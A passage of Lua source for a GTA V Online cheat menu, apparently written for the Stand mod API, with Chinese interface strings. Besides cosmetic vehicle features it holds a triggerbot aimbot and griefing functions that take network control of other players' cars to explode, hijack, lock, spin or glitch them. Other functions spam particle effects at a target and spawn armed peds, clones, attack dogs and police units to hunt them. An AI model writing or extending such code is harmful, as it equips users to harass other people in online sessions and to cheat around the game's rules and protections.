    if memory.read_int(ent_alloc) ~= 0 then 
        local ent = memory.read_int(ent_alloc)
        if ENTITY.GET_ENTITY_TYPE(ent) == 1 and PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ent) then
            if PED.GET_PED_CONFIG_FLAG(players.user_ped(), 78, true) then  
                PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 24, 1.0)
                util.yield(triggerbot_delay)
                PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 24, 0.0)
            end
        end
    end
end

function aa_thread()
    aa_threadv = util.create_thread(function()
        while true do
            if not noaccident then
                util.stop_thread()
            end
            if player_cur_car ~= 0 then
                local c = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
                local size = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car))
                for i=1,3 do
                    if i == 1 then
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, -size['x'], size['y']+0.1, size['z']/2)
                    elseif i == 2 then
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, 0.0, size['y']+0.1, size['z']/2)
                    else
                        aad = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, size['x'], size['y']+0.1, size['z']/2)
                    end
                    if ENTITY.GET_ENTITY_SPEED(player_cur_car) > 10 then
                        log("aa thread allocation")
                        local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
                        SHAPETEST.GET_SHAPE_TEST_RESULT(
                            SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
                                c.x,
                                c.y,
                                c.z,
                                aad.x,
                                aad.y,
                                aad.z,
                                -1,
                                player_cur_car,
                                4
                            ), ptr1, ptr2, ptr3, ptr4)
                        local p1 = memory.read_int(ptr1)
                        local p2 = memory.read_vector3(ptr2)
                        local p3 = memory.read_vector3(ptr3)
                        local p4 = memory.read_int(ptr4)
                        log("aa thread free mem")
                        memory.free(ptr1)
                        memory.free(ptr2)
                        memory.free(ptr3)
                        memory.free(ptr4)
                        local results = {p1, p2, p3, p4}
                        if results[1] ~= 0 then
                            ENTITY.SET_ENTITY_VELOCITY(player_cur_car, 0.0, 0.0, 0.0)
                            util.toast("车辆事故即将发生！ 停止车辆。")
                        end
                    end
                end
            end
        util.yield()
        end
    end)
end

------------------------------------
-----------粒子效果轰炸-------------
------------------------------------
function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        util.yield()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end

local ptfx = {lib = 'scr_rcbarry2', sel = 'scr_clown_appears'}
function ftpxspam(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    Streamptfx(ptfx.lib)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( ptfx.sel, tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 10.0, true, true, true)
end

function ftpxspam_set(fxsel)
    ptfx.sel = Fxha[fxsel]
    ptfx.lib = 'core'
end

------------------------------------
-------------载具恶搞---------------
------------------------------------

function caremp(pid)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        local c = ENTITY.GET_ENTITY_COORDS(car)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 83, 100.0, false, true, 0.0)
    end
end

function carspin(pid)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity_once(car)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(car, 4, 0.0, 0.0, 300.0, 0, true, true, false, true, true, true)
    end
end

local glitchVeh = false
function glitchcar(toggle, pid)
    glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(pid)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if not players.exists(pid) then 
                util.toast("玩家不存在. :/")
                menu.set_value(glitchVehCmd, false);
            util.stop_thread() end

            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("玩家太远了. :/")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                util.toast("他不在车里! ")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("车上没空座位了\n建议你给他车砸了.")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end

function kickcar(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        DECORATOR.DECOR_REGISTER("Player_Vehicle", 3)
        DECORATOR.DECOR_SET_INT(player_veh,"Player_Vehicle", 0)
    else
        util.toast("玩家不在车内. :/")
    end
end

function get_player_vehicle_in_control(pid, opts)
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()) -- Needed to turn off spectating while getting control
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    -- Calculate how far away from target
    local pos1 = ENTITY.GET_ENTITY_COORDS(target_ped)
    local pos2 = ENTITY.GET_ENTITY_COORDS(my_ped)
    local dist = SYSTEM.VDIST2(pos1.x, pos1.y, 0, pos2.x, pos2.y, 0)

    local was_spectating = NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() -- Needed to toggle it back on if currently spectating
    -- If they out of range (value may need tweaking), auto spectate.
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
    if opts and opts.near_only and vehicle == 0 then
        return 0
    end
    if vehicle == 0 and target_ped ~= my_ped and dist > 340000 and not was_spectating then
        menu.toast("AUTO_SPECTATE")
        show_busyspinner(menu.format("AUTO_SPECTATE"))
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, target_ped)
        -- To prevent a hard 3s loop, we keep waiting upto 3s or until vehicle is acquired
        local loop = (opts and opts.loops ~= nil) and opts.loops or 30 -- 3000 / 100
        while vehicle == 0 and loop > 0 do
            util.yield(100)
            vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
            loop = loop - 1
        end
        HUD.BUSYSPINNER_OFF()
    end

    if vehicle > 0 then
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
            return vehicle
        end
        -- Loop until we get control
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vehicle)
        local has_control_ent = false
        local loops = 15
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)

        -- Attempts 15 times, with 8ms per attempt
        while not has_control_ent do
            has_control_ent = NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            loops = loops - 1
            -- wait for control
            util.yield(15)
            if loops <= 0 then
                break
            end
        end
    end
    if not was_spectating then
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false, target_ped)
    end
    return vehicle
end

local function control_vehicle(pid, callback, opts)
    local vehicle = get_player_vehicle_in_control(pid, opts)
    if vehicle > 0 then
        callback(vehicle)
    elseif opts == nil or opts.silent ~= true then
        util.toast("玩家不在车内或不在范围内。")
    end
end

function fastoncar()
    local localped = PLAYER.PLAYER_PED_ID()
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_ENTERING(localped)
        if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(veh) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(veh, 1000)
            VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
        end
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 then
            --15 is heli
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(veh)
        end
    end
end

function unlockcar()
    -- 解锁正在进入的载具
function UnlockVehicleGetIn()
    :: start ::
    local localPed = PLAYER.PLAYER_PED_ID()
    local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(localPed)
    if PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        local v = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(v, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(v, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(v, players.user(), false)
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, false)
        util.yield()
    else
        if veh ~= 0 then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                for i = 1, 20 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    util.yield(100)
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                util.toast("Waited 2 secs, couldn't get control!")
                goto start
            else
                util.toast("Has control.")
            end
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(veh, players.user(), false)
            VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
        end
    end
end
UnlockVehicleGetIn()
end

function FastTurnVehicleWithKeys(scale)
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local velocity = ENTITY.GET_ENTITY_SPEED_VECTOR(veh, true).y
    --Pitch: X || Roll: y || Yaw: z
    local vvPitch = v3.getX(vv)
    local vvRoll = v3.getY(vv)
    local vvYaw = v3.getZ(vv)
    if PAD.IS_CONTROL_PRESSED(0, 63) then --63 || INPUT_VEH_MOVE_LEFT_ONLY || A

        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end

        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.

            local yawAfterPress = vvYaw - scale
            if yawAfterPress < -180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
                local toSetYaw = overFlowNeg - scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end

    end

    if PAD.IS_CONTROL_PRESSED(0, 64) then --64 ||INPUT_VEH_MOVE_RIGHT_ONLY || D

        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
        local yawAfterPress = vvYaw - scale
        if yawAfterPress < -180 then -- check for overflow
            local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
            local toSetYaw = overFlowNeg - scale
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
        else --if not overflow
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
        end

        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.

            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end

    end
    v3.free(vv)
end

local rgb = {cus = 100}

function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end

function rainbow_car()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local red = (math.random(0, 255))
        local green = (math.random(0, 255))
        local blue = (math.random(0, 255))
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        util.yield(rgb.cus)
       end
    end

function set_speed_rainbowcar(c)
    rgb.cus = c
end

local srgb = {cus = 100}

function rainbow_car_light()
    local color = {
        {64, 1}, --blue
        {73, 2}, --eblue  
        {51, 3}, --mgreen
        {92, 4}, --lgreen
        {89, 5}, --yellow
        {88, 6}, --gshower
        {38, 7}, --orange
        {39 , 8}, --red
        {137, 9}, --ponypink
        {135, 10}, --hotpink
        {145, 11}, --purple
        {142, 12} --blacklight
      }
     if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ~= 0 then
      local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
      RGBNeonKit(players.user_ped())
      local rcolor = math.random(1, 12)
      VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
      VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
      VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
      VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
      VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
      VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
      util.yield(srgb.cus)
    end
end

function set_speed_light(c)
    srgb.cus = c
end

function hittheplayerincar()
    local localPed = players.user_ped()
    if not PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        return
    end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
    for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
        local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
        if ENTITY.DOES_ENTITY_EXIST(ped) and ped ~= localPed and PED.IS_PED_A_PLAYER(ped) then
            local playerGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(ped)
            local myGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(localPed)
            PED.SET_RELATIONSHIP_BETWEEN_GROUPS(4, playerGroupHash, myGroupHash)
        end
    end
end

function ramdomupdatecar()
    local mod_types = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 12, 14, 15, 16, 23, 24, 25, 27, 28, 30, 33, 35, 38, 48}
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        for i, upgrades in ipairs(mod_types) do
            VEHICLE.SET_VEHICLE_MOD(entities.get_user_vehicle_as_handle(), upgrades, math.random(0, 20), false)
        end
    end
    util.yield(100)
end


function on_user_change_vehicle(vehicle)
    if vehicle ~= 0 then
    end
end

function changecarsit(seatnumber)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
	local vehicle = entities.get_user_vehicle_as_handle()
	PED.SET_PED_INTO_VEHICLE(ped, vehicle, seatnumber)
end

function set_vehicle_handling_value(veh, offset, value)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    memory.write_float(handling + offset, value)
end

jclll = {"不上锁","上锁"}
function gethimcar(pid)
    control_vehicle(pid, function(vehicle)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, -2.0, 0.0, 0.1)
        ENTITY.SET_ENTITY_VELOCITY(vehicle, 0, 0, 0)
        local ped = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true)
        TASK.TASK_ENTER_VEHICLE(ped, vehicle, -1, -1, 1.0, 24)
        if hijackLevel == 1 then
            util.yield(20)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        end
        for _ = 1, 20 do
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped, vehicle, 100.0, 2883621)
            util.yield(50)
        end
    end)
end

function randomupdatcar(pid)
    control_vehicle(pid, function(vehicle)
        VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
        for x = 0, 49 do
            local max = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, x)
            VEHICLE.SET_VEHICLE_MOD(vehicle, x, math.random(-1, max))
        end
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(-1,5))
        for x = 17, 22 do
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, x, math.random() > 0.5)
        end
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
    end)
end

DecorFlag_isAttacker = 1 << 2
local attacker = {
    stationary 	= false,
    godmode = false
}


local make_attacker = function (ped, targetId, weaponHash)
    set_decor_flag(ped, DecorFlag_isAttacker)
    PED.SET_PED_MAX_HEALTH(ped, 500)
    ENTITY.SET_ENTITY_HEALTH(ped, 500, 0)
    WEAPON.GIVE_WEAPON_TO_PED(ped, weaponHash, -1, true, true)
    WEAPON.SET_CURRENT_PED_WEAPON(ped, weaponHash, false)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, attacker.godmode)
    PED.SET_PED_COMBAT_MOVEMENT(ped, attacker.stationary and 0 or 2)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 0, false)
    PED.SET_RAGDOLL_BLOCKING_FLAGS(ped, 1)
    PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 2)
    PED.SET_PED_CONFIG_FLAG(ped, 208, true)
    PED.SET_PED_HEARING_RANGE(ped, 150.0)
    PED.SET_PED_SEEING_RANGE(ped, 150.0)
    add_ai_blip_for_ped(ped, true, false, 250.0, -1, -1)

    util.create_tick_handler(function ()
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
        local pedPos = ENTITY.GET_ENTITY_COORDS(ped, false)
        if not ENTITY.DOES_ENTITY_EXIST(ped) or ENTITY.IS_ENTITY_DEAD(ped, false) then
            return false
        elseif not is_player_active(targetId, false, true) or
        players.get_position(targetId):distance(pedPos) > 250.0 and not PED.IS_PED_INJURED(ped) then
            remove_decor(ped)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, false)
            WEAPON.REMOVE_ALL_PED_WEAPONS(ped, true)
            HUD.SET_PED_HAS_AI_BLIP(ped, false)
            TASK.CLEAR_PED_TASKS(ped)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, false)
            TASK.TASK_WANDER_STANDARD(ped, 10.0, 10)
            PED.SET_PED_KEEP_TASK(ped, true)
            local pHandle = memory.alloc_int()
            memory.write_int(pHandle, ped)
            ENTITY.SET_PED_AS_NO_LONGER_NEEDED(pHandle)
            return false
        elseif not PED.IS_PED_IN_COMBAT(ped, target) and not ENTITY.IS_ENTITY_DEAD(target, false) then
            TASK.CLEAR_PED_TASKS(ped)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
            TASK.TASK_COMBAT_PED(ped, target, 0, 16)
        end
    end)
end

function spawn_attacker(pid, caption, model)
    local i = 0
    local modelHash <const> = util.joaat(model)
    request_model(modelHash)
    repeat
        i = i + 1
        local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = get_random_offset_from_entity(targetPed, 2.0, 4.0)
        pos.z = pos.z - 1.0
        local ped = entities.create_ped(0, modelHash, pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(ped), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(ped), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true, 1)
        set_entity_face_entity(ped, targetPed, false)
        local weapon <const> = weaponList.selected or table.random(Weapons)
        local weaponHash <const> = util.joaat(weapon)
        make_attacker(ped, pid, weaponHash)
        util.yield(150)
    until count == i
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(modelHash)
end

function spawn_attacker_own(pid)
    local i = 0
    repeat
        i = i + 1
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = get_random_offset_from_entity(target, 2.0, 4.0)
        pos.z = pos.z - 1.0
        local clone = entities.create_ped(4, ENTITY.GET_ENTITY_MODEL(target), pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(clone), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(clone, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(clone), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(clone, true, 1)
        PED.CLONE_PED_TO_TARGET(target, clone)
        set_entity_face_entity(clone, target, false)
        local weapon <const> = weaponList.selected or table.random(Weapons)
        local weaponHash <const> = util.joaat(weapon)
        make_attacker(clone, pid, weaponHash)
        util.yield(150)
    until count == i
end

function spawn_attacker_click(pid)
    local i = 0
local pedHash <const> = util.joaat("a_c_chop")
request_model(pedHash)
repeat
    i = i + 1
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = get_random_offset_from_entity(target, 2.0, 4.0)
    pos.z = pos.z - 1.0
    local ped = entities.create_ped(28, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(ped), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(ped), players.user(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true, 1)
    set_entity_face_entity(ped, target, false)
    make_attacker(ped, pid, util.joaat("weapon_animal"))
    util.yield(150)
until count == i;
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end

function spawn_attacker_count(value)
    count = value 
end

function spawn_police_car(pid)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local offset = get_random_offset_from_entity(targetPed, 50.0, 60.0)
    local outCoords = v3.new()
    local outHeading = memory.alloc(4)
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        local vehicleHash <const> = util.joaat("police3")
        local pedHash <const> = util.joaat("s_m_y_cop_01")
        request_model(vehicleHash); request_model(pedHash)

        local pos = ENTITY.GET_ENTITY_COORDS(targetPed, false)
        local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
        if not ENTITY.DOES_ENTITY_EXIST(vehicle) then return end
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, false)
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
        VEHICLE.SET_VEHICLE_SIREN(vehicle, true)
        AUDIO.BLIP_SIREN(vehicle)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, attacker.godmode)

        local pSequence = memory.alloc_int()
        TASK.OPEN_SEQUENCE_TASK(pSequence)
        TASK.TASK_COMBAT_PED(0, targetPed, 0, 16)
        TASK.TASK_GO_TO_ENTITY(0, targetPed, 6000, 10.0, 3.0, 0.0, 0)
        TASK.SET_SEQUENCE_TO_REPEAT(memory.read_int(pSequence), true)
        TASK.CLOSE_SEQUENCE_TASK(memory.read_int(pSequence))

        for seat = -1, 0 do
            local cop = entities.create_ped(5, pedHash, outCoords, 0.0)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(cop, true, false)
            set_decor_flag(cop, DecorFlag_isAttacker)
            PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
            PED.SET_PED_RANDOM_COMPONENT_VARIATION(cop, 0)
            local weapon <const> = (seat == -1) and "weapon_pistol" or "weapon_pumpshotgun"
            WEAPON.GIVE_WEAPON_TO_PED(cop, util.joaat(weapon), -1, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(cop, 1, true)
            PED.SET_PED_AS_COP(cop, true)
            ENTITY.SET_ENTITY_INVINCIBLE(cop, attacker.godmode)
            TASK.TASK_PERFORM_SEQUENCE(cop, memory.read_int(pSequence))
        end

        TASK.CLEAR_SEQUENCE_TASK(pSequence)
        AUDIO.PLAY_POLICE_REPORT("SCRIPTED_SCANNER_REPORT_FRANLIN_0_KIDNAP", 0.0)
    end
end

function send_attacker_god(toggle)
    attacker.godmode = toggle 
end

function send_attacker_stay(toggle)
    attacker.stationary = toggle
end

function attacker_dele()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if is_decor_flag_set(ped, DecorFlag_isAttacker) then entities.delete_by_handle(ped) end
    end
end

tow_options = {"从前面", "从后面"}
function towcarpro(pid, index, value)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local last_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, true)
        local cur_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
        if last_veh ~= 0 then
            if last_veh == cur_veh then
                kick_from_veh(pid)
                last_veh = cur_veh
                util.yield(2000)
            end
            request_control_of_entity(last_veh)
            tow_hash = -1323100960
            request_model_load(tow_hash)
            tower_hash = 0x9C9EFFD8
            request_model_load(tower_hash)
            local rots = ENTITY.GET_ENTITY_ROTATION(last_veh, 0)
            local dir = 5.0
            hdg = ENTITY.GET_ENTITY_HEADING(last_veh)
            if index == 2 then
                dir = -5.0
                hdg = hdg + 180
            end
            local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_veh, 0.0, dir, 0.0)
            local tower = entities.create_ped(28, tower_hash, coords, 30.0)
            local towtruck = entities.create_vehicle(tow_hash, coords, hdg)
